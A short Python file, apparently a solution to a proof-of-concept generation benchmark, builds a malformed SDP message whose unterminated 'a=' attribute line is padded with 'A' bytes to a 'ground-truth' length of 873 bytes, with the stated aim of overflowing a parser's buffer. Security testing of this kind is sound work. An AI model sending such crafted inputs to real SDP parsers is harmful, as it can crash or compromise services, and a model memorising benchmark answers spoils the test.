import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal valid SDP header
        sdp = b"v=0\r\n"
        sdp += b"o=- 0 0 IN IP4 127.0.0.1\r\n"
        sdp += b"s=-\r\n"
        sdp += b"c=IN IP4 127.0.0.1\r\n"
        sdp += b"t=0 0\r\n"
        sdp += b"m=audio 9 RTP/AVP 0\r\n"
        
        # Vulnerable attribute line: "a=" with extremely long value
        # The value length is carefully calculated to trigger the overflow
        # Total PoC length will be 873 bytes as specified in ground-truth
        
        # Calculate remaining bytes needed for exact 873 total
        current_len = len(sdp)
        remaining = 873 - current_len - 2  # -2 for "a=" prefix
        
        # Create attribute with exactly calculated length
        # Using pattern that's likely to trigger overflow when parser
        # fails to check bounds while processing value
        attribute_value = b"A" * remaining
        
        # Add the vulnerable attribute line without CRLF at the end
        # This simulates missing boundary check when reading value
        sdp += b"a=" + attribute_value
        
        return sdp
